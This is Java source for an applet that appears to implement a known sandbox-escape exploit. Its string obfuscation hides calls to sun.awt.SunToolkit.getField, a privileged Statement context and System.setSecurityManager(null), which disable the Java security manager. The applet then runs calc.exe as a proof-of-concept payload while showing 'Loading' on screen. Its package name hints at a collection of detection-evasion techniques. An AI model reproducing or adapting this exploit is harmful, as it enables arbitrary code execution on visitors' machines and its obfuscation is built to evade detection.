package techniques.c;

import java.applet.Applet;
import java.awt.Graphics;
import java.beans.Expression;
import java.beans.Statement;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;
import java.util.Random;

public class Application extends Applet {

	private static final String s1 = l(r(l(r("se" + "tSecu"))) + "rityMa" + (" nager".toLowerCase().trim()));
	private static final String s2 = "fi" + l("le") + ":/" + r("//");
	private static final String s3 = "v33".replace("3", "c").replace("v", "b").replace("b", "a");
	private static final String s4 = (String) (new Random().nextInt(2) < 3 ? "4Lame".replace("" + 4, "for").replace("L", "N") : false); 
	private static final String s5 = ("son" + "." + r(r("wt") + "a") + "." + "Sun2lkyt").replace("so", "su").replace("" + 2, "Too ".trim()).replace("y", "i");
	private static final String s6 = "g" + e().charAt(0) + "tFi" + e().charAt(2) + "ld";
	private static final String s7 = "c" + "all".substring(0,2) + s3.charAt(1) + ",".replace(",", ".") + e();
	private static final String s8 = r("ao" + Character.toUpperCase('l')) + r("gnid");
	
	private static String e(){
		return "" + (char) 0x65 + (char) 0x78 + ((char) (0x64 + 0x01));
	}
	
	private static String r(String s){
		return new StringBuilder(s).reverse().toString();
	}
	
	private static String l(String s){
		String result = "";
		for(Character c : s.toCharArray()){
			result += c;
		}
		return r(r(result));
	}
	
	private static final long serialVersionUID = 1L;

	@Override
	public void init() {
		try {
			Statement ls = new Statement(System.class, s1, new Object[1]);
			Permissions lp = new Permissions();
			lp.add(new AllPermission());
			ProtectionDomain lpd = new ProtectionDomain(new CodeSource(new URL(s2), new Certificate[0]), lp);
			AccessControlContext lacc = new AccessControlContext(new ProtectionDomain[] { lpd });
			Object arr1[] = {s5};
			Expression exp1 = new Expression(Class.class, s4, arr1);
			exp1.execute();
			Class<?> c = (Class<?>) exp1.getValue();
			Object arr2[] = new Object[2];
			arr2[0] = Statement.class;
			arr2[1] = s3;
			Expression exp2 = new Expression(c, s6, arr2);
			exp2.execute();
			((Field) exp2.getValue()).set(ls, lacc);
			ls.execute();
			Process localProcess = null;
			localProcess = Runtime.getRuntime().exec(s7);
			localProcess.waitFor();
		} catch (Throwable t) {
			t.printStackTrace();
		}
	}

	@Override
	public void paint(Graphics paramGraphics) {
		paramGraphics.drawString(s8, 50, 25);
	}
}
